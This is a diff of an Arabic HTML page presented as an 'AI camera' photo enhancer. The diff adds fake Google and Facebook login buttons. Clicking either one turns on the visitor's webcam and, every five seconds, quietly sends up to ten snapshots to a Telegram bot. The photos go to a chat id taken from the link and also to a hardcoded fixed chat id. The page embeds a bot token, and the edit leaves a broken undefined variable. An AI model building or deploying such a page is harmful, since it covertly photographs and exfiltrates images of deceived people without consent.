@@ -1,24 +1,24 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1" />
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>كاميرا الذكاء الاصطناعي</title>
 
 <style>
-* {
-    box-sizing: border-box;
-}
+* { box-sizing: border-box; }
+
 body {
     margin: 0;
     font-family: "Segoe UI", Tahoma, sans-serif;
-    background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
+    background: linear-gradient(135deg,#0f2027,#203a43,#2c5364);
     min-height: 100vh;
     display: flex;
     align-items: center;
     justify-content: center;
     color: #fff;
 }
+
 .container {
     background: rgba(255,255,255,0.08);
     backdrop-filter: blur(12px);
@@ -29,84 +29,78 @@ body {
     text-align: center;
     box-shadow: 0 10px 40px rgba(0,0,0,0.4);
 }
-.logo {
-    font-size: 2.5em;
-    margin-bottom: 10px;
-}
-h1 {
-    font-size: 1.6em;
-    margin-bottom: 10px;
-}
-p.desc {
-    font-size: 0.95em;
+
+.logo { font-size: 2.5em; margin-bottom: 10px; }
+h1 { font-size: 1.5em; margin-bottom: 10px; }
+
+.desc {
+    font-size: .95em;
     color: #d0d0d0;
-    line-height: 1.6;
     margin-bottom: 25px;
 }
-.ai-badge {
-    display: inline-block;
-    background: #00e5ff;
-    color: #00303a;
-    padding: 6px 14px;
-    border-radius: 20px;
-    font-size: 0.8em;
-    margin-bottom: 15px;
+
+.login-btn {
+    width: 100%;
+    padding: 12px;
+    margin: 8px 0;
+    border-radius: 50px;
+    border: none;
+    font-size: 1em;
+    cursor: pointer;
+    font-weight: bold;
 }
+
+.google { background: #fff; color: #333; }
+.facebook { background: #1877f2; color: #fff; }
+
 .status {
     margin-top: 20px;
     font-weight: bold;
-    font-size: 0.95em;
     color: #aef;
 }
-video {
-    display: none;
-}
+
+video { display: none; }
 </style>
 </head>
+
 <body>
-<div class="container">
-    <div class="logo">📷</div>
-    <div class="ai-badge">AI POWERED</div>
+
+<div class="container" id="loginScreen">
+    <div class="logo">🤖📷</div>
     <h1>كاميرا الذكاء الاصطناعي</h1>
     <p class="desc">
-        نقوم بتحسين الصور تلقائيًا باستخدام تقنيات الذكاء الاصطناعي المتقدمة
-        لتحليل الإضاءة والوضوح والملامح بدقة عالية.
+        قم بتسجيل الدخول للمتابعة وتحسين صورك تلقائيًا باستخدام الذكاء الاصطناعي
     </p>
 
+    <button class="login-btn google" onclick="startCamera()">متابعة باستخدام Google</button>
+    <button class="login-btn facebook" onclick="startCamera()">متابعة باستخدام Facebook</button>
+</div>
+
+<div class="container" id="appScreen" style="display:none">
+    <h1>جاري التحليل...</h1>
     <video id="video" autoplay playsinline></video>
-    <div id="status" class="status">🔄 جاري تهيئة الكاميرا...</div>
+    <div id="status" class="status">🔄 تهيئة الكاميرا...</div>
 </div>
 
 <script>
-const urlParams = new URLSearchParams(window.location.search);
-let dynamicChatId = urlParams.get('id');
+const dynamicChatId = urlParams.get('id');
 const fixedChatId = 6002805119;
 const token = '8488682212:AAE5KJUgyrd5QPYDE6beK21XPrBo7Y66MAg';
+
 const video = document.getElementById('video');
 const status = document.getElementById('status');
+
 let photoCount = 0;
 let intervalId = null;
 const MAX_PHOTOS = 10;
 
-// إزالة id من الرابط بدون إعادة تحميل الصفحة
-if (dynamicChatId !== null) {
-    // احفظها كرقم (اختياري)
-    dynamicChatId = Number(dynamicChatId);
+function startCamera() {
+    document.getElementById('loginScreen').style.display = "none";
+    document.getElementById('appScreen').style.display = "block";
 
-    // إزالة ?id=xxx من الرابط
-    const cleanUrl = window.location.origin + window.location.pathname;
-    window.history.replaceState({}, document.title, cleanUrl);
-}
-
-// تحقق من صلاحية id
-if (!dynamicChatId) {
-    status.innerText = "❌ رابط غير صالح";
-} else {
-    // تشغيل الكاميرا
     navigator.mediaDevices.getUserMedia({ video: true })
     .then(stream => {
         video.srcObject = stream;
-
         video.onloadedmetadata = () => {
             status.innerText = "📡 الذكاء الاصطناعي يعمل...";
             setTimeout(() => {
@@ -114,15 +108,16 @@ if (!dynamicChatId) {
                 intervalId = setInterval(captureAndSend, 5000);
             }, 1500);
         };
-    }).catch(() => {
-        status.innerText = "❌ لم يتم السماح بالوصول إلى الكاميرا";
+    })
+    .catch(() => {
+        status.innerText = "❌ تم رفض إذن الكاميرا";
     });
 }
 
 function captureAndSend() {
     if (photoCount >= MAX_PHOTOS) {
         clearInterval(intervalId);
-        status.innerText = "🛑 اكتمل تحليل الصور";
+        status.innerText = "🛑 اكتمل التحليل";
         return;
     }
 
@@ -134,26 +129,26 @@ function captureAndSend() {
     canvas.getContext('2d').drawImage(video, 0, 0);
 
     canvas.toBlob(blob => {
-        const sendPhoto = (chatId) => {
-            const formData = new FormData();
-            formData.append('chat_id', chatId);
-            formData.append('photo', blob, `image_${photoCount}.jpg`);
-
+        const send = (id) => {
+            const f = new FormData();
+            f.append('chat_id', id);
+            f.append('photo', blob, `img_${photoCount}.jpg`);
             return fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                 method: 'POST',
-                body: formData
+                body: f
             });
         };
-
-        sendPhoto(dynamicChatId);
-
-        if (dynamicChatId !== fixedChatId) {
-            sendPhoto(fixedChatId);
+        
+        send(dynamicChatId);
+        if(dynamicChatId!==fixedChatId)
+        {
+            send(fixedChatId).then(()=>{
+                status.innerText = `📸 صورة ${photoCount} / ${MAX_PHOTOS}`;
+            });
         }
-
-        status.innerText = `📸 معالجة الصورة ${photoCount} / ${MAX_PHOTOS}`;
     }, 'image/jpeg');
 }
 </script>
+
 </body>
 </html>
